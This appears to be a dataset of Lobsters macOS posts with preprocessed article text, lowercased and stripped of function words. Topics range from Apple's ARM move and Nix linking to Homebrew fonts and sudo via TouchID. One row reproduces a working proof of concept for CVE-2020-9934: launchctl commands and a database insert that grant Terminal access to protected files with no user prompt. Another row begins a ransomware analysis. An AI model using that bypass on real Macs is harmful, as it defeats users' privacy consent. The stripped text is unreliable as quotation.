10,Lobsters,mac,Apple macOS,"Apple, ARM, and What It Means",https://www.ifixit.com/News/42949/apple-arm-and-what-it-means,apple arm mean,htomariflickr note syonyk project blog apple transition arm possibility apple moving arm processor apple modern phone processor started giving intel offering solid competitor really happened arm huh instruction set architecture powerpc powerpc intel opcodes quite riscv intel amd power netbooks intel sdm arm small powerefficient cheap good enough apple arm big powerefficient intel stuck broken microarchitecture process slipped yet broken term security netburst sgx enclave terminal faultforeshadow apple arm advantage security processor shipping carryon luggage roughly nowhere arm emulation rosetta provide integrated emulation virtualization goodbye native window performance mikrotik winbox software ecosystem yay raspberry pi raspberry pi raspberry pi jetson nano intel future moore law iphone review,photo htomariflickr note guest post russell graf writes computer project syonyk project blog edited version post apple transition arm found interesting view necessarily represent ifixit past year apple mac run intel processor using architecture competing pc meanwhile apple used arm processor mobile device ever since first iphone apple often seemed stymied intel slower pace innovation compared large stride mobile power year people discussing possibility apple moving arm processor desktop laptop reinvention read like something open question sure thing ever since apple modern phone processor started giving intel offering solid competitor really happened apple use custombuilt arm processor power macbooks point probably imacs mac pro lot people seem confused really mean know way around deep processor weed interesting ton uninformed garbage internet usual offer attempt clarify thing arm huh apple third major instruction set architecture isa transition history moved powerpc powerpc intel arm make pretty much consumer hardware company regularly change processor architecture certainly largest pull consistently instruction set nearly lowest level language processor speaks defines opcodes execute gut processor quite throughout history computing adding two number loading value memory deciding instruction execute next talking external hardware defined isa modern world consumer computing two matter though arm sorry riscv yet recently division simple processor intel amd ran desktop laptop server arm processor ran phone tablet printer everything else except loon like insisted reason making little arm computer function desktop thing worked anymore intel amd power decade king performance hill chip intel amd within rounding implementation pentium core athlon xeon powerhouse run office application run game run giant datacenters run internet fast powerful intel king though amd made proper nuisance regular basis fact extension probably running developed amd licensed intel powersipping atom processor netbooks massive xeons opterons data center covered default long desktop server people even think isa year old introduced accumulated lot cruft baggage year instruction maddeningly complex sort weird corner nasty gotchas gotten worse time mmx sse vmx tsx sgx txt smm stm either idea shuddering bit internally add go read intel sdm fun bored enjoyable also pretty darn complicated arm small powerefficient cheap historically arm architecture lowerpower far cheaper powerefficient alternative set fairly small cheap make powerefficient focused blazingfast performance usually good enough result ended everything desktop laptop last year two arm chip started firing solid cannon blast across bow intel xeon chip datacenter care raw singlethreaded performance care awful lot total throughput power efficiency arm server chip properly impressive le money xeon computing power fewer watt bad arm chip made way laptop desktop threat flagship performance intel apple occasion totally insane interesting way apple arm big powerefficient fast company license arm reference core etc attach desired peripheral resulting arm chip run fast company arm chip core clock rate company proper license engineering staff build totally custom arm core apple one company starting processor iphone used custom processor implementation arm processor sure reference arm processor implementation first fairly impressive time clearly phone chip meant save power run cool apple got crazy iphone probably faster anything else house term singlethreaded mere watt apple quietly iterating custom arm core created something properly barely anyone noticing meantime yeah review score got impressive year yeah modern android device stomped iphone anything massively phone threaten desktop laptop laptop far thermal capacity power offer one apple chip phone iphone battery working new macbook pro battery making time larger go screen good bit power throw computing plug computer well power problem interesting also intel found stuck intel stuck broken microarchitecture kept intel last year none surprise might notice seem produce strikingly similar processor every year sometimes month intel stuck process year plan slipped yet microarchitecture fundamentally broken term security worse fully understand chip anymore yes intel iterating releasing improvement okay made last two everyone else leapfrogged intel used unquestioned lead rest tech industry building chip showed intel chip post netburst used le power gave performance anything else solid chip performed well worth money case lost lead lost lead previous chip getting slower age might heard meltdown spectre camel nose laundry list issue recently discovered flaw microcode update software recompilation kernel workarounds workarounds slow processor haswell processor today run code slowly came whoop finally intel reason chip anymore seem unable fully understand chip know know quite regularly microarchitectural vulnerability come rip open secure sgx worst terminal faultforeshadow fix cache enclave transition hit processing speed dealbreaker point intel know problem told would want chained intel anymore good reason amd caught apple move one thirdparty vendor another pulling interesting apple arm advantage custombuilt arm chip give apple better control stack translate rather nicely better user experience least user apple able deliver performance le bargain able integrate stuff chip even power saving need separate security processor build main processor die stuck dealing whatever integrated gpu abomination intel dumped generation design chip need hardware acceleration stuff care yes know intel bad used sincerely doubt apple happy integrated gpus fewer chip also mean smaller generally mean le power consumption better performance important ever apple literally sitting limit much battery laptop claim laptop disclaimer might ask wrong battery warrant disclaimer saying actually le lot shipping carryon luggage regulation use usually phrased le apple explicitly clear laptop le advertise equal usps shipping ups something say battery ship battery essentially declare hazardous material customerfriendly scene apple literally put battery laptop expect ship inexpensively let people travel easily way increase runtime reduce power use apple arm chip almost certainly use le power intel chip work apple might keeping tradition use custom chip offer smaller lighter laptop battery nobody else touch either way bold move set apart rest industry stuck intel longer microsoft arm ambition gone roughly nowhere linuxonly hardware big seller outside chromebooks apple also gain lot able put stuff io device laptop think machine learning accelerator neural network engine speech recognition gap iphone macbook pro ought narrow significantly might even see return laptop builtin cellular modem arm emulation sticking point apple switching arm first foremost current mac based happens existing software switching arm mean software work without translation turn apple massive amount experience exactly sort thing made binary run fine powerpc made powerpc binary run acceptably rosetta provide integrated emulation emulating hard especially want fast lot work time jit space thing like javascript apple emulation expect jit engine used infrequently real performance come binary binary source code get turned arm binary let figure weirder feature like flag register updated every instruction needed ignored one could also bit work figure arm rather relaxed memory model compared cause problem build barrier easy certainly type thing apple done sound like rosetta continue trend would interesting though think apple might pull would going native library call recompiling program know code going call apple library function got bit creative emulated software could jump emulated application code native library code would gain lot performance back thing apple library lot would native performance virtualization goodbye native window performance next question least subset user virtual machine well arm support virtualization want run linux vm run arm linux vm need application say window interesting watch fully expect solution year ago ran window powerpc hardware know sort performance get full system emulation arm normally thing gone way emulate slow arm system fast machine performance great good enough going way though nobody really tried never really fast arm chip mess course apple chip faster comparable intel chip spend time emulation maybe come even ahead hoping run weird utility mikrotik winbox come mind sort thing run sure good enough solution maybe light fire microsoft fix arm version window emulator game probably sorry software ecosystem yay though really excited something almost nobody else care software ecosystem going get fixed fast playing arm desktop pi raspberry pi raspberry pi jetson nano swell interest use raspberry pi armbased chromebooks similar device made living arm tolerable daytoday livable stuff though software build randomly fail clearly little development polishing end thing like signal building arm ancient dependency nested inside node dependency know mean apple moving highend arm space expect fast great news light arm system even personally macbook intel future leave intel depends bit good apple soon intel get back track intel iterates quickly get process working fix underlying microarchitecture properly instead using university r dqa lab good decade back forth apple team excellent intel well used excellent least certainly got resource throw crash headlong brick wall end moore law getting creative ideally way leak secret going important could end something like state phone anandtech iphone review benchmark latest flagship web performance top go apple apple previous generation apple generation big gap rest pack yes mention iphone desktop grade chip term spec benchmark performance could laptopdesktop market look bad probably possibility really depends apple chip designer waiting wing someone finally said watt play apple moving away intel data center working arm option cheaper buy cheaper run faster bargain intel might hard hill may make back
11,Lobsters,mac,Apple macOS,CVE-2020–9934: Bypassing TCC,https://objective-see.com/blog/blog_0x4C.html,bypassing tcc,matt shockley personal site background article thus application gain write access database give entitlement also without ever prompting user bug ghidra stack exchange post thus could set environment variable point directory control restart daemon directly modify database give every entitlement available without ever prompting end user proof concept available github timeline,bypassing tcc unauthorized access sensitive user data matt shockley july guest blog post security researcher matt shockley describes lovely security vulnerability uncovered macos bug allowed complete bypass tcc draconian entitlement check without writing single line code writeup originally posted personal site mahalo sharing matt research tool writing supported friend objectivesee background transparency consent control tcc framework apple subsystem denies installed application access sensitive user data without explicit permission user generally form popup message tcc prompt opening spotify first time tcc also run io bug restricted o x variant learn tcc work especially catalina recommend reading article application attempt access file directory protected tcc without user authorization file operation fail tcc store userlevel entitlement database disk homelibraryapplication supportcomappletcctccdb apple us dedicated daemon tccd loggedin user one system level daemon handle tcc request daemon sit idle receive access request o application attempting access protected data listing currently running tcc daemon daemon receives request first check tcc database see user either allowed denied access requested data application tcc us previous decision otherwise prompt user choose whether allow application access thus application gain write access tcc database give tcc entitlement also without ever prompting user bug obviously able write directly database completely defeat purpose tcc apple protects database tcc system integrity protection sip even program running root modify database unless comappleprivatetccmanager comapplerootlessstoragetcc entitlement however database still technically owned readablewriteable currently running user long find program entitlement control database tcc database permission since tcc daemon directly responsible reading writing tcc database prime candidate tccd entitlement immediately opening tcc daemon ghidra looking code related handling database operation noticed something seem right ghidra decompiler view database opening code essentially tcc daemon attempt open database program try directly open create already existing database homelibraryapplication supportcomappletcctccdb seems inconspicuous first becomes interesting realize control location tcc daemon read writes control home environment variable contains tricking tcc use nonsip protected directory database initially dismissed fun trick actual tcc daemon running via launchd completely ignores database daemon o communicates authorization event however day later stumbled across stack exchange post realized since tcc daemon running via launchd within current domain could also control environment variable passed launched thus could set home environment variable launchctl point directory control restart tcc daemon directly modify tcc database give every tcc entitlement available without ever prompting end user actually modify sipprotected tcc database bug also added benefit completely resetting tcc previous state home unset launchctl daemon restarted proof concept poc bug actually pretty simple requires code written reset database case cheating tccutil reset mimic tcc directory structure library mkdir p tmptccbypasslibraryapplication supportcomappletcc cd new directory cd tmptccbypasslibraryapplication supportcomappletcc set launchd home temporary directory launchctl setenv home tmptccbypass restart tcc daemon launchctl stop comappletccd launchctl start comappletccd print content tcc database give terminal access document tccdb dump tccdb insert access value ktccservicesystempolicydocumentsfolder comappleterminal null null unused null null list document directory without prompting end user l document also full swift writeup available github swift poc example output timeline feb issue reported apple product security team feb apple review report begin investigation issue apr apple confirms bug fixed future update jul apple release patch bug security update
12,Lobsters,mac,Apple macOS,"20 Years Ago, Steve Jobs Built Apple's G4 Cube. It Bombed",https://www.wired.com/story/20-years-ago-steve-jobs-built-the-coolest-computer-ever-it-bombed/,year ago steve job built apple cube bombed,flaw would shut fewer unit talk july article excerpt,admitted gorgeous question earlier conversation drawn apple product matrix four square representing laptop desktop high low end since returning apple filled quadrant imac power mac ibook powerbook cube violated wisdom product plan power feature highend power mac like slot huge storage way expensive lowend imac even spent necessary separate display required cube owner knowing risking ire asked going buy job miss beat easy said ton people pro every designer going buy one justification violating matrix theory realized incredible opportunity make something middle sort love child truly breakthrough said implicit message great people would alter buying pattern purchase onethat happen one thing price time bought display almost three time price imac even powermacs large people spend art budget computersthat issue cube plastic hard manufacture people reported flaw air cooling problem left sheet paper top device would shut prevent overheating button stray wave hand would send machine action like notin case cube failed push button computerbuying public job told would sell million apple sold fewer unit apotheosis apple design also apex apple hubris listening tape struck much job drunk elixir aesthetic really want put hole thing put button job asked justifying lack power switch look energy put slot drive tray want ruin put button something else job cube speaks failure successful leader clear cube brick quick cut loss move onin talk oxford apple ceo tim cook talked cube described spectacular commercial failure first day almost job reaction bad sale figure showed quickly became necessary could abandon even product dear heart steve everyone known life cook said oxford could avid proponent position within minute day new information came would think never ever thought think tape prove happy birthday steve job digital love childtime travelmy july newsweek article cube came sidebar excerpt interview steve job
13,Lobsters,mac,Apple macOS,Unshaky: software utility for macOS laptops with butterfly keyboard double press problems,https://github.com/aahung/Unshaky,unshaky software utility macos laptop butterfly keyboard double press problem,unshaky unshaky user complaint unshaky unshaky keyboard service program macbook macbook pro service program complaint issue howto video walkthrough download file howto download unshakyapp grant accessibility permission input monitoring enough catalina launch startup optional configure delay defective key pick appropriate delay faq visit wiki community localization contributor open issue big community contributor provide translation,unshaky unshaky try address issue butterfly keyboard macbook macbook air macbook pro later double key press see user complaint apple made difficult replace keyboard cost hundred dollar unshaky might save keyboard dismissing second key hit key press occur later x millisecond previous effective one fixed w key unshaky work open issue image illustrates unshaky work june good news apple launched keyboard service program macbook macbook pro go get keyboard fixed maybe temporarily may apple extends service program cover macbook air pro gen butterfly keyboard complaint issue howto video walkthrough click image watch youtube ca nt watch clicking image download file howto download unshakyapp first move unshakyapp application folder grant accessibility permission input monitoring enough catalina follow instruction first open unshaky instruction work go system preference security privacy privacy tab accessibility left panel add unshakyapp make sure checked launch startup optional go system preference user group login item tab add unshakyapp configure delay defective key click unshaky icon menu bar select configure configure delay defective key pick appropriate delay nt think universal delay value people type fast might want shorter delay use m since fast typer long delay type apple second p likely blocked user found m sweet spot issue m suggestion start short delay like m gradually increase faq visit wiki community localization contributor help translate unshaky language open issue prepare related file translation contribution valuable make unshaky accessible user big thank community contributor provide translation
14,Lobsters,mac,Apple macOS,You can install fonts with homebrew?,https://changelog.com/posts/you-can-install-fonts-with-homebrew,install font homebrew,cask font j party live recording,yesterday learned yil thing manually download font find ttf file install via fontbook like animal instead rely homebrew official cask font running brew tap homebrewcaskfonts installing favorite font testing new one easy sunday morning brew cask install fontfiracode want browse font available cask brew search font searching specific font quite remember name grep away brew search font grep fira long time homebrew fanperson probably already knew know know oh strange reason want see actual moment learned fact watch tail end j party live recording yesterday
15,Lobsters,mac,Apple macOS,Return and Enter Are Two Different Keys,https://daringfireball.net/2020/07/return_and_enter,return enter two different key,return enter two different key based notion enter synonym return key key code look keyboard script debugger bbedit shell worksheet,return enter two different key monday july new york time mini crossword clue weekend based notion enter synonym return key two different key usually perform action always keyboard dedicated return key big key thinking right shift key mac key code press return glyph key dedicated enter key generally present extended keyboard numeric keypad key lowerright corner generally oversized key keyboard larger vertically horizontally mac key code glyph look keyboard return key say return enter key say enter keyboard dedicated enter key type enter key pressing fnreturn return key enter printed small type word return keyboard neither dedicated enter key fn modifier key think type enter without resorting return enter usually perform action always tweetbot mac editing tweet return insert newline character enter immediately send tweet script editor script debugger return insert newline enter compile script bbedit shell worksheet return insert newline enter execute current line spreadsheet number return confirm content cell editing move selection next row enter confirm content current cell general rule differ return simply key typing newline character classic mac o literally return character let get whereas enter enters already typed without adding new
16,Lobsters,mac,Apple macOS,Debugging a dynamic linking bug in a Nix project,https://www.johnbcoughlin.com/posts/nix-dynamic-linking/,debugging dynamic linking bug nix project,debugging dynamic linking bug nix project trying nix development experience scientific project nix direnv wrapping c compiler override default petsc derivation nix pill whither linker edit keep filed ticket section installname depravity section helpful blog post gotcha petsc derivation line post epilogue first contribution,debugging dynamic linking bug nix project trying nix development experience day building scientific project contributor ran nasty version conflict two system library fit pique decided learn enough nix able set reproducible tightly controlled local build done overall happy tooling setup using direnv tightly integrate normal shell nix nixshell feature part everything feel seamless extremely refreshing see cmake report found plethora binary library contenthashed installed neat little row nixstore using nix manage development environment build project nix ensures project dependency installed discoverable compiler linker building project done cmake set cmake find nixinstalled library nix achieves wrapping c compiler shell script injecting path library binary via environment variable little make cmake work beyond declaring package want buildinputs first version shellnix file looked like file shellnix pkgs import nixpkgs pkgsmkshell buildinputs pkgs cmake callpackage nixpetscnix metis openmpi package packagesnumpy using setup little trouble getting project build override default petsc derivation compile metis openmpi support hard file nixpetscnix petsc blas gfortran lapack python metis openmpi petscoverrideattrs oldattrs rec nativebuildinputs blas gfortran gfortrancclib lapack python openmpi metis preconfigure export fc gfortran bingfortran gfortran bingfortran patchshebangs configureflagsarray configureflagsarray withmpidir openmpi withmetis metis withblaslib blas liblibblasso gfortrancclib liblibgfortrana withlapacklib lapack libliblapackso gfortrancclib liblibgfortrana nix file return function invoked shellnix using callpackage function petscoverrideattrs neat way override attribute derivation created stdenvmkderivation building petsc mpi metis support simple passing different set argument configure script figuring fun mostly referred nix pill great progression nix tool language nix file able execute cmake make successfully getting project run another story final binary failed immediately dynamic loading error binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found binary trying load dynamic lib one temporary directory nix created process building petsc course failed time invoked binwarpxm directory cleaned instead file privatetmp binary linked result petsc derivation nix store nixstore point seemed environment variable incorrectly set intermediate directory figure would learn lot linking o x ever expected whither linker first checked compiler linker flag inserted nix compiler wrapper come via nixcflagscompile nixldflags working nixshell direnv environment variable derivation injected shell simple matter echoing echo nixcflagscompile isystem echo nixldflags look fine invoking cmake make shell ought pull correct library remembered project us pkgconfig find pull together linked library frankly understand pkgconfig well know project invoked inside cmake search library according rule run nix done job setting everything therefore circumvents compiler linker flag checked happened pkgconfig installed setting nix environment therefore cmake able invoke system pkgconfig user path perhaps system version pkgconfig somehow finding wrong library indeed echo pkgconfigpath confirmed searching directory home thought possible wire got crossed adding dependency nix derivation one time configuring pkgconfig appropriately might help edit since tried pure shell clean path removed something bashrc nixshell source might cause common belief nixshell isolated user installed passing pure flag wrong fact keep user whole path around filed ticket address however using nixshell believe super useful tool even without hermetically isolating development environment referred nix wiki page c project also section using pkgconfig seems including pkgconfig derivation nativebuildinput let package like petsc append output path pkgconfigpath environment variable pkgsmkshell buildinputs pkgs nativebuildinputs pkgs pkgconfig fix problem would go deeper track bad library pulled digging cmake documentation project cmake file led insert trio print statement findpackage pkgconfig required pkgcheckmodules petsc petsc required linkdirectories petsclibrarydirs message petsc library petsclibraries message petsc library dirs petsclibrarydirs message petsc link library petsclinklibraries list append warpxmlinktargets petsclibraries printed three line cmake output petsc library petsc petsc library dirs petsc link library second two look good first library name petsc little implicit comfort precisely variable appended link target list compile time would linker find library petsc sure would look safer use absolute path dylib like list append warpxmlinktargets petsclibraries list append warpxmlinktargets petsclinklibraries thinking wrong sure linker look compile time path listed nixldflags thinking clearly flow data compilation process changing link target absolute path eased mind duration next cmake make cycle surely way linker could screw arcane library search involved absolute path possibly binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found damn installname depravity point absolutely flummoxed every fix attempted grepped vainly offending privatetmp path build directory come emptyhanded tracked final irrevocable link option passed compiler tucked away linktxt file build tree showed incontrovertibly binary linked correct library cat buildsrccmakefileswarpxmdirlinktxt applicationsxcodeappcontentsdevelopertoolchainsxcodedefaultxctoolchainusrbinc dndebug isysroot proved nearly satisfaction cmake right thing library completely idea finally lucky google search led section nix manual describing issue specific darwin macos platform state darwin library linked using absolute path library resolved installname link time sometimes package set correctly causing library lookup fail runtime fixed adding extra linker flag running installnametool id fixupphase matteroffact way stating something understood flabbergasted best understanding happens macos source code include directive include petsch something like creates binary interface satisfied linker link time pas list absolute path library linker find one match interface linker save installname library found binary load section run time binary actually macos dyld system load library installname look certainly gotten aspect wrong would definitely appreciate hearing someone understands better case find pointed concept installname something go searching led helpful blog post describing exactly issue facing also described check installname library otool gotcha nix manual state package set correctly point fix use installnametool change installname built library petsc derivation nixpkgs correctly saw something installnametool prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool installnametool directive replaces appearance string usrbininstallnametool installnametool reason nix package ensure build rely nixbuilt tool provided build shell path binary system directory like usrbin pr introduced substitution indicates fixed build darwin must invocation usrbininstallnametool petsc searching petsc repo lead line exactly mark log post installname instructed change installname absolute path library installation directory using installnametool id ospathsplitext dst dylib ospathisfile usrbininstallnametool output err flg selfexecuteshellcommand otool src oldname output outputfind n installname oldnamereplace ospathrealpath selfarchdir selfinstalldir selfexecuteshellcommand usrbininstallnametool id installname dst according installname library repaired petsc library built notice something second condition statement petsc derivation run prepatch step condition become ospathisfile installnametool certainly fail installnametool going file directory configure running patched configure script silently skip step leaving installname library temporary directory built luckily solution problem hard instead name program path pas absolute path program want run done overriding prepatch step like prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool darwincctools bininstallnametool nix variable darwincctools expand full path built darwincctools derivation directory nixstore patched statement inside petsc configurepy becomes ospathsplitext dst dylib ospathisfile use installnametool installname resulting library correct check otool otool looking much better since error dynamically loaded library even recompile check working build git master binwarpxm dyld loaded usersjacksrcwarpxmbuildbinwarpxm dyld loaded dyld loaded dyld loaded dyld loaded like epilogue spent time debugging problem without working understanding different build phase clear neither cmake pkgconfig setup could cause time invoking cmake offending privatetmp directory long vanished focused exclusively petsc derivation provided nix might homed installnametool patch little sooner went lucky find note nix manual darwinspecific linker problem nix absolutely using remarkable little impact able use manage environment project without impacting way developer manage environment course asked would advocate try nix nice everyone able time also looking forward first contribution nix
17,Lobsters,mac,Apple macOS,httpflow: command line utility to capture and dump HTTP stream,https://github.com/six-ddc/httpflow,httpflow command line utility capture dump http stream,httpflow installation macos linux release usage,httpflow installation macos brew update brew install httpflow linux centos yum update yum install libpcapdevel zlibdevel pcredevel ubuntu debian aptget update aptget install libpcapdev git clone http githubcomsixddchttpflow cd httpflow make make install directly download release binary file usage libpcap version libpcap version httpflow version usage httpflow interface r pcapfile u urlfilter w outputpath expression interface listen interface tcpdump interface r pcapfile read packet file created tcpdump w option standard input used file u urlfilter match url dumped w outputpath write http request response specific directory expression selects packet dumped format tcpdump expression argument filter expression given packet expression true dumped expression syntax see pcapfilter information see http githubcomsixddchttpflow capture default interface use expression filter capture result expression given packet net dumped expression syntax see pcapfilter httpflow host host httpbinorg host baiducom use regexp filter request url httpflow u user read packet pcapfile tcpdump w acap httpflow r acap tcpdump w httpflow r write http request response directory tmphttp
18,Lobsters,mac,Apple macOS,Linux Impressions,https://jorin.me/linux-impressions/,linux impression,let start hardware let talk software firefox alacritty neovim keepassxc kdenlive krita ob studio nice commenter told integration kde file browser package management manjaro aur homebrew ubuntu spectacle tunnelblick basic command line tool configuration arch wiki kde gnome gnome tweak tool alacritty neovim slack firefox desktop icon qt gtk performance conclusion,one year ago still macbook pro work macbook air home thinkpad running manjaro kde dell xps running ubuntu gnome using linux way even started programming last year macos since cool devs use since back two linux machine main conclusion definitely good enough still difference let start hardware still stand touchpad speaker macbook personally thing keyboard though prefer thinkpad dell either use headphone connect external speaker anyways thinkpad impressive amount port hdmi lan sim card usb many two machine mostly usbc headphone adapter dell probably favorite size keyboard touchpad overall feel let talk software notable software use firefox alacritty neovim dropbox spotify keepassxc plus yubikey work also slack docker virtualbox google drive occasionally also use kdenlive krita ob studio steam luckily work system docker feel faster linux probably related u lot volume mounting huge productivity win work since run everything docker google provide linux client google drive enough use web version plus nice commenter told integration kde file browser allows access file transparently also promising open source paid client need access file offline monitor printer bluetooth speaker bluetooth xbox controller worked device far package management installing software big deal system manjaro found software need right available repository also include aur arch linux experience nicer homebrew mac often slowing since updating time nicer apt ubuntu package often outdated nonexistent also like rolling release manjaro big scary upgrade get ubuntu macos also really like setting ui manjarokde configure even switch linux kernel also interesting mac actually install software linux starting homebrew package management spectacle aligning window tunnelblick vpn also many basic command line tool configuration experience macos actually annoying general pretty polished rather annoying issue linux distros also issue enough flexibility enough help online fix especially nice arch wiki using manjaro definitely tweaked setting linux think spent time since simply lot option available work around le issue found thing much easier configure kde gnome gnome definitely want install gnome tweak tool even much le setting many thing configured terminal linux definitely want enjoy freedom theme setup desktop way like small time effort seems totally worth even improves experience staring screen hour every day little bit theme everything apps like alacritty neovim slack firefox desktop icon rather keep effort low since mostly one time thing setup thing happily work vim ssh server day long gladly use gui configure desktop environment kde definitely shine system setting allow search download install theme everything also icon set installed terminal using gnome also relevant kde built top qt gnome built gtk use apps built qt apps built gtk kde nicer job integrating apps gui toolkits also straight forward theme right kde setting performance try benchmarking interesting perceived performance say biggest difference already mentioned docker apart file search editor also starting application definitely faster linux krunner kde also feel faster searching gnome spotlight mac mostly tell difference manjarokde ubuntugnome looking system status see manjarokde consumes le ressources le systemd service running definitely surprise find kde lightweight gnome used different booting system say dell bios seems fastest lenovo thinkpad slowest lenovo prefers like show giant red logo bit longer actual linux distros pretty fast find kde give smoother booting experience manjaro loading screen ubuntu show loading screen second one point macbooks sleep mode closing laptop lid last longer think mac switch hibernate automatically hibernate work linux laptop seems faster rebooting scratch conclusion hope experience report helpful course applies specific use case preference might still takeaway others please reach tell experience preference thought also feel free ask additional info help
19,Lobsters,mac,Apple macOS,"sudo with TouchID and Apple Watch, even inside tmux",http://andre.arko.net/2020/07/10/sudo-with-touchid-and-apple-watch-even-inside-tmux/,sudo touchid apple watch even inside tmux,touchid apple watch even inside install fork sudo custom pam module shared twitter configure use fix named stack overflow answer chrisjohnsen cabel fabianishere reattachtousernamespace tmux reflejo straight c module apple biscuitehh,jul sudo touchid apple watch even inside tmux ever since touchid introduced macbook pro wondered could replace user authentication dialog gui like system preference installer command line thing like sudo perhaps predictably many nerd internet idea could install fork sudo custom pam module get touchid support turn none actually needed though somewhat obscure builtin way enable shared twitter surprisingly apple actually ship pam module named pamtidso every copy macos configure sudo use skip typing password touchid instead without completely destroy security machine unfortunately never worked debugging later figured worked inside regular shell inside shell opened tmux ssh since pretty much exclusively use shell opened tmux ssh spent time frantically googling around fix found pretty much nothing worked outside tmux work inside tmux fast forward three year today griping friend work inside tmux discovered technology advanced fix named pamreattach pam module configure run builtin pamtidso make sudo command able find use touchid module authenticate even inside tmux amazingly even able find written explanation thought process produced pam module form stack overflow answer based answer linked discussion seems step apple patch screen stay attached user gui login session cli tool like pbcopy security system call like touchid check continue work chrisjohnsen us undocumented function called screen patch implement nowubiquitous reattachtousernamespace command allows pbcopy pbpaste continue working inside tmux nonapple screen touchid macbooks emerged cabel reveals existence pamtidso touchid authentication sudo unfortunately work nongui process like ssh tmux homebrewed screen fabianishere inspired apple patch screen sends pull request reenable touchid reattachtousernamespace tmux discussion unfortunate tradeoff pr closed create new pam module analogous reattachtousernamespace pam flow pamreattach enables touchid sudo tmux homebrewed screen macos catalina apple add apple watch confirmation touchid system apple watch configured unlock mac also doubletap watch button confirm touchid prompt instead scanning finger enterprising swift coder reflejo wrote new pam module enable touchid support named pamtouchid implemented swift shorter opinion easier understand straight c module apple biscuitehh content apple watch sudo exclusively mac touchid hardware forked pamtouchid pamwatchid pam module allows sudo via apple watch mac pretty excited finally sudo using fingerprint watch little bit awe way determined nerd manage figure thing eventually nice work everyone
20,Lobsters,mac,Apple macOS,Tiger to Catalina: let’s port some code,https://www.sicpers.info/2020/07/tiger-to-catalina-lets-port-some-code/,tiger catalina let port code,bean much step make xcode happy step remove reference next objectivec runtime diagnose stack smash side quest rationalise version check ship ship see source github,many part modern software stack around long time tradeoff term user experience great thing software incrementally improved providing customer familiarity stability need learn entirely new thing existing thing keep working also great developer mean play red queen always running stand still focus improving customer experience knowing everything wrote date still work still work cocoa example continuous history back code written use cocoa apis going back let port old cocoa software see little effort stay date bean free word processor macos written objectivec using mostly cocoa carbon apis us cocoa text system current version bean free support macos open source version bean support intel powerpc would take make modern cocoa app couple hour work gave fullyworking bean catalina lot unnecessary sidequesting step make xcode happy bean built using o x sdk probably needed xcode xcode o x sdk let build macos sdk instead also accepted whatever suggested updated setting xcode showed enabled fobjcweak flag using automatic reference counting turn deployment target support build run right quite step remove reference next objectivec runtime bean us method swizzling ie swapping method implementation runtime mostly work around difference api behaviour tiger leopard code longer compiles error incomplete definition type struct objcmethod origmethod methodtypes file included note forward declaration struct objcmethod typedef struct objcmethod method reason apple introduced objectivec runtime leopard made impossible directly access data structure used runtime structure stayed header couple release long gone first thought first fix delete code eventually relented wrapped project still build back assuming update sdk setting build cleanly using clang xcode build beta xcode fact ok ship right diagnose stack smash launched crashed straight away stack trace look like thread queue comapplemainthread stop reason excbadaccess frame libmainthreadcheckerdylib checkerc frame libmainthreadcheckerdylib trampolinec frame libmainthreadcheckerdylib handlerstart frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview drawinsertionpointinrect color turnedon frame appkit nstextview nsprivate viewdiddrawinlayer incontext um well definitely good backtrace api code except main top nstextview really changed much get infinite loop try draw cursor actually one many patch appkit app swizzled category nstextview replaces two method see stack trace could change swizzled method see way make work remove side quest rationalise version check everything work app built powerpc mac o x ported early point intel run couple change macos want fix one thing message appears launch would like get rid bean warning gestalt selector gestaltsystemversion returning instead bug gestalt documented limitation use nsprocessinfo operatingsystemversion property get correct system version number call location bean carboncore gestaltsystemversionblockinvoke bean libdispatchdylib dispatchclientcallout bean libdispatchdylib dispatchoncecallout bean carboncore gestaltsystemversion bean carboncore gestalt bean bean jhdocumentcontroller init bean appkit nscustomobject nibinstantiate little history back classic mac o gestalt used like unix programmer use sysctl soda drink maker use high fructose corn syrup want expose information add gestalt bloated enough drink gestalt api take selector pointer memory get written memory depends selector gestaltsystemversion selector make write o version number memory well us bit turned fine apple release many operating system used one octet major minor patch release number macos represented mac o x came along gestalt part carbon api version reported major release bumped first version patch level release jaguar point someone apple realised ever sixteen patch release sixteen minor release would break capped patchminor number told stop using gestaltsystemversion would like stop using lot version number check bean put one place given two way check version nsprocessinfo isoperatingsystematleastversion available use actually never relevant test version api added fall back gestalt separate gestaltsystemversionmajorminor selector exist back perfect fails earliest o bean run actually tell run quits apple added minimumsystem check launch service could use infoplist say whether app work mechanism supported ship done haha kidding done launching thing enough better test dark mode thing tiger thing bean assumes set background nstextview white explicitly set actually ship see source github particularly change needed make cocoa application work macos despite couple cpu family switch bunch change ui
21,Lobsters,mac,Apple macOS,OSX.EvilQuest Uncovered,https://objective-see.com/blog/blog_0x59.html,osxevilquest uncovered,sample background dinesh devadoss ransomwhere part two infection vector tweet thomas reed mixed key analysis virustotal wwwisacaorg blockblock part two conclusion blockblock ransomwhere patreon,osxevilquest uncovered part infection persistence patrick wardle june research tool writing supported friend objectivesee want play along added sample osxevilquest malware collection password infect background early today noted malware researcher dinesh devadoss tweeted new piece macos malware ransomware tendency impersonating google software update program zero detection everyday new piece malwareransomware uncovered target macos moreover ransomwhere tool claim able generically detect threat decided take anlayze malware confirm tool indeed detect priori knowledge first part twopart blog post series discus malware infection vector perform initial triage uncover persistence antianalysis logic part two detect capability insidious threat infection vector dinesh tweet apparent ransomware able infect macos user however thomas reed malwarebytes objective sea speaker noted malware found pirated version popular macos software shared popular torrent site method infection though relatively unsophisticated somewhat common thus indicating least level successful example macos malware spreading via infected torrent include intego researcher found osxshlayer spreading via bittorrent file sharing site appearing fake flash player update user attempt select link copy torrent magnet link ethical reason aside generally unwise install pirated software often infected malware torrent site notorious distributing malware adware sometimes misleading advertisement sometimes trojan horse downloads claim crack may contain infected copy legitimate software intego sample analyzing today packaged pirated version popular dj software mixed key malicious package unsigned macos prompt user allowing opened however macos user attempting pirate software may likely ignore warning pressing onwards ensuring infection commences analysis noted ransomware distributed via trojanzied installers sample dive distributed via disk image named mixed key currently disk image flagged antivirus engine virustotal though likely change av engine update signature database mount disk image via hdiutil utility hdiutil attach downloadsmixed key guidpartitionscheme appleapfs 